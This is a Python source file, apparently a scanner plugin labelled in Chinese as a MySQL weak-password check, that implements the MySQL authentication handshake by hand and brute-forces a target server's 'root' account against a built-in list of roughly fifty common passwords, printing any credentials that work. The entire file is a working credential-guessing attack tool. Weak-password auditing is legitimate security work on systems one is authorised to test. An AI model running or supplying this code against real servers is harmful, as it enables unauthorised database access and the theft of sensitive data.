#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re
import hashlib
import struct
import socket
import sys


def get_plugin_info():
    plugin_info = {
        "name": "MySQL 弱口令",
        "desc": "导致数据库敏感信息泄露，严重可导致服务器直接被入侵。",
        "grade": "高",
        "type": "service",
        "keyword": "service:mysql port:3306"
    }
    return plugin_info
    
def get_sha1(s):
    sha1 = hashlib.sha1()
    sha1.update(s)
    return sha1.digest()
def get_hash(password, scramble):
    hash_stage1 = get_sha1(password.encode())
    hash_stage2 = get_sha1(hash_stage1)
    to = get_sha1(scramble + hash_stage2)
    reply = [h1^h3 for (h1, h3) in zip(hash_stage1, to)]
    hash = struct.pack('20B', *reply)
    return hash

def get_scramble(packet):
    tmp = packet[15:]
    m = re.findall(b"\x00?([\x01-\x7F]{7,})\x00", tmp)
    if len(m) > 3: del m[0]
    scramble = m[0] + m[1]
    try:
        plugin = m[2]
    except:
        plugin = ''
    return plugin, scramble

def get_auth_data(user, password, scramble, plugin):
    user_hex = user.encode().hex()
    pass_hex = get_hash(password, scramble).hex()
    if not password:
        data = "85a23f0000000040080000000000000000000000000000000000000000000000" + user_hex + "0000"
    else:
        data = "85a23f0000000040080000000000000000000000000000000000000000000000" + user_hex + "0014" + pass_hex
    if plugin: data += plugin.hex() + "0055035f6f73076f737831302e380c5f636c69656e745f6e616d65086c69626d7973716c045f7069640539323330360f5f636c69656e745f76657273696f6e06352e362e3231095f706c6174666f726d067838365f3634"
    len_hex = hex(int(len(data) / 2)).replace("0x", "")
    auth_data = len_hex + "000001" + data
    return bytes.fromhex(auth_data)
def mysql_auth(ip,user,pwd,port=3306):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        packet = sock.recv(254)
        plugin, scramble = get_scramble(packet)
        auth_data = get_auth_data(user, pwd, scramble, plugin)
        sock.send(auth_data)
        result = sock.recv(1024)
        if result == b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00":
            return True
    except Exception as e:
        if "Errno 10061" in str(e) or "timed out" in str(e): return
        
def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':3306'
    host,port = check_port(arg).split(':')
    timeout = 5
    user_list = ['root',]
    passwd_list = ["123456","admin","root","password","123123","123","1",
        "{user}","{user}{user}","{user}1","{user}123","{user}2016","{user}2015",
        "{user}!","","password01!","root@dba","P@ssw0rd!!","qwa123","root#123",
        "12345678","test","123qwe!@#","123456789","123321","1314520","666666",
        "woaini","fuckyou","000000","1234567890","8888888","qwerty","1qaz2wsx",
        "abc123","abc123456","1q2w3e4r","123qwe","159357","p@ssw0rd","p@55w0rd",
        "password!","p@ssw0rd!","password1","123qwe!@#","123QWE!@#","!@#qwe123",
        "123qwe!@#$","1qaz@WSX","r00t","tomcat","apache","system"]
    error_i = 0
    for user in user_list:
        for pass_ in passwd_list:
            try:
                passwd = pass_.replace('{user}', user)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, int(port)))
                packet = sock.recv(254)
                plugin, scramble = get_scramble(packet)
                auth_data = get_auth_data(user, passwd, scramble, plugin)
                sock.send(auth_data)
                result = sock.recv(1024)
                if result == b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00":
                    return f'{arg}\t{user}/{passwd}'
            except Exception as e:
                if "Errno 10061" in str(e) or "WinError 10061" in str(e) or "timed out" in str(e): error_i += 1
            if error_i >= 3: return

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

